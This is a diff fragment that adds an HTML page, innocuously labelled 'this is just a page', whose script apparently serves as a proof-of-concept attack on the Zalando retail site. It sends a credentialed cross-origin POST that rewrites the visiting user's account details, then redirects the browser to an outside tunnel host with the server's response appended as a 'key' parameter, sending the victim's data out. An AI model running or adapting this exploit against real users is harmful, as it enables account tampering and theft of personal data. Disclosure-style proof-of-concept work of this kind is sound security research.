@@ -12,3 +12,27 @@
         };
     </script>
 </html>
+<html>
+    <p>this is just a page</p>
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('POST', 'https://www.zalando.at/api/user-account-details/details', true);
+        req.withCredentials = true;
+        req.setRequestHeader('Content-Type', 'application/json');
+
+        var jsonPayload = JSON.stringify({
+            "first_name": "Zack",
+            "last_name": "efron",
+            "fashion_category": [],
+            "birth_date": "2001-02-12",
+            "phone": ""
+        });
+
+        req.send(jsonPayload);
+    
+        function reqListener() {
+            location = 'https://nasty-glasses-love.loca.lt/?key=' + this.responseText;
+        };
+    </script>
+</html>
